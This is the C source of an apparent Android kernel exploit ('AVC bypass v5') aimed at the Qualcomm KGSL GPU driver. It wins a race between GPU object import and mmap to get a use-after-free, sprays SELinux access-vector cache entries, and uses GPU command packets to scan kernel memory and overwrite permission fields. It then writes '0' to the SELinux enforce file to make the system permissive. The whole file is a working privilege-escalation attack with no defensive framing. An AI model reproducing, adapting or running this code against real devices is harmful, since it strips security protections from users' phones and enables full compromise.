#include "avc_bypass.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <poll.h>
#include <dirent.h>

int kgsl_fd = -1;
volatile int race_done = 0;

void die(const char *msg) {
    perror(msg);
    exit(1);
}

void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0)
        die("gpuobj_alloc");
    return a.id;
}

void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
    if (p == MAP_FAILED)
        die("gpuobj_mmap");
    return p;
}

int gpuobj_info(int fd, unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr)
        *gpuaddr = inf.gpuaddr;
    return ret;
}

void gpuobj_free(int fd, unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0)
        die("gpuobj_free");
}

unsigned int create_context(int fd) {
    struct kgsl_drawctxt_create c = {
        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
    };
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0)
        die("create_context");
    return c.drawctxt_id;
}

int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = {
        .context_id = ctx_id,
        .type = KGSL_TIMESTAMP_RETIRED
    };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0)
            return -1;
        if (r.timestamp >= target)
            return 0;
        usleep(100);
    }
    return -2;
}

int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_ga, size_t bytes,
              unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object o = {
        .gpuaddr = ib_ga,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&o,
        .cmdsize = sizeof(o),
        .numcmds = 1,
        .context_id = ctx_id
    };
    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts)
        *out_ts = gc.timestamp;
    return ret;
}

void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr,
        .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
        .type = KGSL_USER_MEM_TYPE_ADDR
    };
    while (!race_done)
        ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

void gen_avc_entries(void) {
    for (int pid = 1; pid <= 500; pid++) {
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char tmp[64];
            read(fd, tmp, 64);
            close(fd);
        }
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        fd = open(path, O_RDONLY);
        if (fd >= 0)
            close(fd);
    }
}

void dump_avc_page(uint64_t va, uint32_t *d, int n_slots) {
    printf("\n  AVC candidate @ 0x%llx\n", (unsigned long long)va);
    int shown = 0;
    for (int slot = 0; slot < 56 && shown < n_slots; slot++) {
        int idx = slot * 72 / 4;
        if (idx + 13 >= SCAN_DWORDS)
            break;
        uint32_t ssid = d[idx], tsid = d[idx+1], tclass = d[idx+2] & 0xFFFF;
        uint32_t allowed = d[idx+3];
        uint64_t pprev = ((uint64_t)d[idx+13] << 32) | d[idx+12];
        uint32_t pprev_hi = d[idx+13];
        if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
            tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF) {
            printf("  [%2d] ssid=%-5u tsid=%-5u tclass=%-3u allowed=0x%08x pprev=0x%012llx\n",
                   slot, ssid, tsid, tclass, allowed,
                   (unsigned long long)pprev & 0xFFFFFFFFFFFFULL);
            shown++;
        }
    }
}

/* ===== main ===== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[+] AVC bypass v5: uid=%d euid=%d\n", getuid(), geteuid());

    /* Phase 1: Fork AVC children BEFORE UAF (their cred is in normal memory) */
    printf("[*] Phase 1: Fork %d AVC children (before UAF)\n", N_AVC_CHILD);
    int start_pipe[2]; pipe(start_pipe);
    int done_pipe[2]; pipe(done_pipe);
    int setenforce_pipe[2]; pipe(setenforce_pipe);
    fcntl(start_pipe[0], F_SETFD, FD_CLOEXEC); fcntl(start_pipe[1], F_SETFD, FD_CLOEXEC);
    fcntl(done_pipe[0], F_SETFD, FD_CLOEXEC); fcntl(done_pipe[1], F_SETFD, FD_CLOEXEC);
    fcntl(setenforce_pipe[0], F_SETFD, FD_CLOEXEC);

    for (int i = 0; i < N_AVC_CHILD; i++) {
        pid_t p = fork();
        if (p == 0) {
            close(start_pipe[1]); close(done_pipe[0]); close(setenforce_pipe[1]);
            prctl(PR_SET_NAME, "AVCCHILD");
            /* Wait for start signal */
            char sig;
            if (read(start_pipe[0], &sig, 1) != 1) _exit(0);
            close(start_pipe[0]);
            /* Step A: Generate unique AVC entries (fill existing slab pages) */
            gen_avc_entries();
            /* Signal parent: done generating */
            write(done_pipe[1], "G", 1);
            /* Wait for setenforce signal */
            if (read(setenforce_pipe[0], &sig, 1) != 1) _exit(0);
            close(setenforce_pipe[0]);
            /* Step B: Do setenforce 0 */
            int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
            if (fd >= 0) { write(fd, "0", 1); close(fd); }
            _exit(0);
        }
    }
    close(start_pipe[0]); close(done_pipe[1]);

    /* Phase 2: UAF setup + race */
    printf("[*] Phase 2: UAF setup\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    uint64_t fl = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, fl);
    void *um = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (um == MAP_FAILED) die("mmap UAF");
    munmap(um, UAF_SIZE);
    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
        die("mmap BOGUS");
    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, fl);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PH");

    printf("[*] Phase 3: Race\n");
    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, fl);
    pthread_t thr;
    pthread_create(&thr, NULL, race_thread, NULL);
    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d\n", i);
    }
    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return 1; }
    printf("[+] Race won\n");

    printf("[*] Phase 4: Free UAF\n");
    gpuobj_free(kgsl_fd, uaf_id);
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(50000);

    /* Phase 5: Start AVC children (gen unique entries → fill existing slab) */
    printf("[*] Phase 5: Start AVC children\n");
    for (int i = 0; i < N_AVC_CHILD; i++)
        write(start_pipe[1], "G", 1);
    close(start_pipe[1]);

    /* Wait for all children to finish generating */
    printf("[*] Phase 5b: Wait for AVC generation...\n");
    for (int i = 0; i < N_AVC_CHILD; i++) {
        char c;
        read(done_pipe[0], &c, 1);
    }
    close(done_pipe[0]);
    printf("  All children done generating\n");

    /* Phase 6: A few children do setenforce 0 (creates denied entry in new UAF page) */
    printf("[*] Phase 6: Signal 3 children to setenforce 0\n");
    for (int i = 0; i < 3; i++)
        write(setenforce_pipe[1], "S", 1);

    /* Wait briefly for entry creation */
    usleep(500000);

    /* Phase 7: GPU scan for AVC pages in UAF range */
    printf("[*] Phase 7: GPU scan for AVC pages\n");
    fflush(stdout);
    unsigned int ctx = create_context(kgsl_fd);
    int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
    void *ib_m = gpuobj_mmap(kgsl_fd, 0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(kgsl_fd, ib_id, &ib_ga);
    int dst_id = gpuobj_alloc(kgsl_fd, 0x4000, fl);
    void *dst_m = gpuobj_mmap(kgsl_fd, 0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(kgsl_fd, dst_id, &dst_ga);
    uint64_t scan_start = UAF_ADDR + 0x300000;
    uint64_t scan_len = UAF_SIZE - 0x300000;
    uint64_t scan_end = scan_start + scan_len - 0x1000;

    uint64_t avc_vas[512];
    int n_avc = 0;
    for (uint64_t va = scan_start; va < scan_end && n_avc < 512; va += 0x1000) {
        if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i*4, &dl, &dh);
            split64(va + i*4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0;
            cmd[dw++] = dl;
            cmd[dw++] = dh;
            cmd[dw++] = sl;
            cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) < 0)
            break;
        if (wait_timestamp(kgsl_fd, ctx, ts) < 0)
            break;
        __sync_synchronize();
        uint32_t *d = (uint32_t *)dst_m;
        int ahits = 0;
        for (int ofs = 0; ofs < 4032; ofs += 72) {
            int idx = ofs / 4;
            if (idx + 13 >= SCAN_DWORDS)
                break;
            uint32_t ssid = d[idx];
            uint32_t tsid = d[idx+1];
            uint32_t tclass = d[idx+2] & 0xFFFF;
            uint32_t pprev_hi = d[idx + 13];
            if (ssid > 0 && ssid < 10000 && tsid > 0 && tsid < 10000 &&
                tclass > 0 && tclass < 1000 && (pprev_hi >> 16) == 0xFFFF)
                ahits++;
        }
        if (ahits >= 3) {
            dump_avc_page(va, d, ahits > 20 ? 20 : ahits);
            avc_vas[n_avc] = va;
            n_avc++;
        }
    }
    printf("\n  Found %d AVC pages\n", n_avc);

    /* Phase 8: GPU overwrite ALL found AVC pages' allowed = 0xFFFFFFFF */
    printf("[*] Phase 8: GPU overwrite %d AVC pages\n", n_avc);
    for (int p = 0; p < n_avc; p++) {
        memset(ib_m, 0, 0x10000);
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int slot = 0; slot < 4032; slot += 72) {
            uint64_t allowed_addr = avc_vas[p] + slot + 12;
            uint32_t al, ah;
            split64(allowed_addr, &al, &ah);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
            cmd[dw++] = al;
            cmd[dw++] = ah;
            cmd[dw++] = 0xFFFFFFFF;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
            wait_timestamp(kgsl_fd, ctx, ts);
    }

    /* Phase 9: Signal remaining children to setenforce 0 */
    printf("[*] Phase 9: Signal remaining %d children to setenforce 0\n", N_AVC_CHILD - 3);
    for (int i = 3; i < N_AVC_CHILD; i++)
        write(setenforce_pipe[1], "S", 1);
    close(setenforce_pipe[1]);

    /* Phase 10: Wait + check success */
    printf("[*] Phase 10: Check SELinux status\n");
    usleep(500000);
    int success = 0;
    for (int attempt = 0; attempt < 20 && !success; attempt++) {
        int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (enf >= 0) {
            char ec;
            int n = read(enf, &ec, 1);
            close(enf);
            if (n == 1 && ec == '0') {
                success = 1;
                break;
            }
        }
        /* Try setenforce from parent too */
        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
        if (fd >= 0) {
            if (write(fd, "0", 1) == 1)
                success = 1;
            close(fd);
        }
        if (!success) {
            usleep(100000);
            /* L1 eviction hammer */
            for (int i = 0; i < 5000; i++) {
                int f = open("/proc/self/status", O_RDONLY);
                if (f >= 0) {
                    char b[256];
                    read(f, b, 256);
                    close(f);
                }
            }
        }
    }

    if (success)
        printf("[+] SUCCESS! SELinux permissive!\n");
    else
        printf("[-] Failed (%d AVC pages found)\n", n_avc);

    int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (enf >= 0) {
        char ec;
        int n = read(enf, &ec, 1);
        close(enf);
        if (n == 1)
            printf("  SELinux enforce=%c (%s)\n", ec, ec == '0' ? "permissive" : "enforcing");
    }

    /* Cleanup children */
    close(start_pipe[0]);
    close(done_pipe[0]);
    close(setenforce_pipe[0]);
    for (int i = 0; i < N_AVC_CHILD; i++)
        kill(0, SIGKILL);
    while (waitpid(-1, NULL, WNOHANG) > 0);
    printf("[*] Done.\n");
    return success ? 0 : 1;
}
